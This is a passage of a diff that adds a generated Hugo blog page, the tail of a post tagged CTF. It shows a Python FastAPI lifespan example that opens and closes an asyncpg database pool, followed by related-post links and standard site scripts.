+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">fastapi</span> <span class="kn">import</span> <span class="n">FastAPI</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">contextlib</span> <span class="kn">import</span> <span class="n">asynccontextmanager</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">asyncpg</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义 lifespan 上下文管理器</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@asynccontextmanager</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">lifespan</span><span class="p">(</span><span class="n">app</span><span class="p">:</span> <span class="n">FastAPI</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 启动阶段：初始化资源</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;应用启动中...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 全局连接池对象</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">state</span><span class="o">.</span><span class="n">db_pool</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncpg</span><span class="o">.</span><span class="n">create_pool</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">user</span><span class="o">=</span><span class="s2">&#34;user&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password</span><span class="o">=</span><span class="s2">&#34;password&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">database</span><span class="o">=</span><span class="s2">&#34;db&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">host</span><span class="o">=</span><span class="s2">&#34;localhost&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">yield</span>  <span class="c1"># 应用正常运行阶段，yield 后执行关闭逻辑</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 关闭阶段：清理资源</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;应用关闭中...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">state</span><span class="p">,</span> <span class="s2">&#34;db_pool&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">await</span> <span class="n">app</span><span class="o">.</span><span class="n">state</span><span class="o">.</span><span class="n">db_pool</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;数据库连接池已关闭&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">FastAPI</span><span class="p">(</span><span class="n">lifespan</span><span class="o">=</span><span class="n">lifespan</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 测试路由：使用数据库连接池</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.get</span><span class="p">(</span><span class="s2">&#34;/db-test&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">db_test</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">async</span> <span class="k">with</span> <span class="n">app</span><span class="o">.</span><span class="n">state</span><span class="o">.</span><span class="n">db_pool</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span> <span class="k">as</span> <span class="n">conn</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="k">await</span> <span class="n">conn</span><span class="o">.</span><span class="n">fetch</span><span class="p">(</span><span class="s2">&#34;SELECT NOW()&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;current_time&#34;</span><span class="p">:</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;now&#34;</span><span class="p">]}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under Calendar</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/posts/%E5%BE%A1%E6%9E%97-homepage/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://raw.githubusercontent.com/calendar0917/images/master/20251020172907999.png" loading="lazy" data-key="" data-hash="https://raw.githubusercontent.com/calendar0917/images/master/20251020172907999.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">御林招新题：Homepage</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/posts/%E5%BE%A1%E6%9E%97-mysql%E4%B8%93%E9%A2%98/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">御林招新题：MySQL专题</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/posts/%E5%BE%A1%E6%9E%97-llm%E4%B8%93%E9%A2%98/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">御林招新题：LLM 专题</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/posts/%E5%BE%A1%E6%9E%97-docker%E5%85%A5%E9%97%A8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">御林招新题：docker 入门</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/posts/%E5%BE%A1%E6%9E%97-docker%E8%BF%9B%E9%98%B6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">御林招新题：docker 进阶</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script
+    src="https://giscus.app/client.js"
+    data-repo="calendar0917/calendar0917.github.io"
+    data-repo-id="R_kgDOPxiY_A"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOPxiY_M4Cwwbp"
+    data-mapping="url"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="preferred_color_scheme"
+    data-lang="en"
+    data-loading=""
+    crossorigin="anonymous"
+    async
+></script>
+<script>
+    function setGiscusTheme(theme) {
+        let giscus = document.querySelector("iframe.giscus-frame");
+        if (giscus) {
+            giscus.contentWindow.postMessage(
+                {
+                    giscus: {
+                        setConfig: {
+                            theme: theme,
+                        },
+                    },
+                },
+                "https://giscus.app"
+            );
+        }
+    }
+
+    (function () {
+        addEventListener("message", (e) => {
+            if (event.origin !== "https://giscus.app") return;
+            handler();
+        });
+        window.addEventListener("onColorSchemeChange", handler);
+
+        function handler() {
+            if (document.documentElement.dataset.scheme === "light") {
+                setGiscusTheme('preferred_color_scheme');
+            } else {
+                setGiscusTheme('preferred_color_scheme');
+            }
+        }
+    })();
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Calendar
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.31.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://calendar0917.github.io/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    
+
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        
+        let btn = document.createElement("div");
+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
+        rightSideBar.appendChild(btn)
+        
+        window.onscroll = function() {
+            
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        };
+    }
+
+    
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+    </body>
+</html>
